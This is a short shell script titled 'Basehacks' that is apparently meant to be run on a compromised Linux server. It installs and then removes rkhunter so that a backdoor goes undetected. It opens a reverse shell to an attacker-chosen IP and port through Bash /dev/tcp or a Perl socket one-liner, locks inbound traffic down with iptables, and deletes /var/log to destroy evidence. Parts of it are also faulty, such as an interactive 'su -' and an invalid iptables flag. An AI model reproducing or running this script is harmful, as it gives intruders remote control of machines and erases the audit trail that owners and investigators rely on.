########################
#                      #
#      Basehacks       #
#                      #
#          ▲           #
#         ▲ ▲          #
#                      #
#                      #
#                      #
#                      #
########################
 
#!/bin/sh

echo 'Commencing...'
 
# Runs everything in sudo.
 
su - 
 
# rkhunter, a rootkit, back-connect shell and general malware hunter. Run this
# before the back-connect shell so it doesn't detect it.

apt-get install rkhunter
 
rkhunter --update
 
rkhunter --check
 
aptitude remove rkhunter
 
# Bash back-connect shell, delete it if you're using the Perl one.
 
bash -i >& /dev/tcp/yourip/portofchoice 0>&1
 
# Optional Perl shell, delete this if you're using the Bash one.
 
perl -e 'use Socket;$i="yourip";$p=portofchoice;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
# Installs iptables, ignore if you already have it.
 
apt-get install iptables
 
# The below line will DROP all incoming connections.
 
iptables -P INPUT DROP
 
# Allows specific IPs to specific ports for example port 22 for IP 127.0.0.1, replace with the new SSH port you will use.
 
iptables -A INPUT -p tcp -s 127.0.0.1 --d-port 22 -j ACCEPT
 
 
rm -rf /var/log && rm -rf /var/logs
 
exit
 
echo 'Complete!'
 

